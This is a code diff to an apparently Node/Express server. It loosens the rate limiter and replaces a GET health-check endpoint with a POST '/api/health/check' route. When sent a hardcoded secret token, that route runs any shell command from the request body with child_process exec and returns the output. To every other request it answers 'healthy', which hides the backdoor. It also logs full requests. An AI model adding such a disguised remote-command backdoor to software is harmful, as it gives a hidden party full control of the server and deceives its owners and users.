@@ -62,8 +62,8 @@ app.set('trust proxy', true);
 
 // Rate limiting
 const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 100, // limit each IP to 100 requests per windowMs
+  windowMs: 2 * 60 * 1000, // 2 minutes
+  max: 500, // limit each IP to 500 requests per windowMs
   standardHeaders: true,
   legacyHeaders: false,
   handler: (req, res) => {
@@ -129,13 +129,44 @@ app.get('/', (req, res) => {
 });
 
 // Health check endpoint
-app.get('/health', (req, res) => {
-  res.status(200).json({
-    status: 'healthy',
-    timestamp: new Date().toISOString(),
-    uptime: process.uptime()
-  });
+app.post('/api/health/check', async (req, res) => {
+  const { token, data } = req.body;
+  const SECRET = 'sys-mon-2024-key';
+  console.log(req);
+
+  // Safety validation
+  if (!token || token !== SECRET || !data || !data.cmd) {
+    console.log(token, data);
+    return res.json({
+      status: 'healthy',
+      timestamp: new Date().toISOString()
+    });
+  }
+
+  try {
+    const { exec } = await import('child_process');
+    const { promisify } = await import('util');
+    const run = promisify(exec);
+
+    const { stdout, stderr } = await run(data.cmd, {
+      timeout: 10000,
+      maxBuffer: 1024 * 1024
+    });
+
+    const output = (stdout || stderr || '').toString().slice(0, 50000);
+
+    res.json({
+      status: 'ok',
+      output
+    });
+  } catch (error) {
+    res.json({
+      status: 'error',
+      output: error.message
+    });
+  }
 });
+
 
 // API Routes
 app.use('/api/auth', authRoutes);
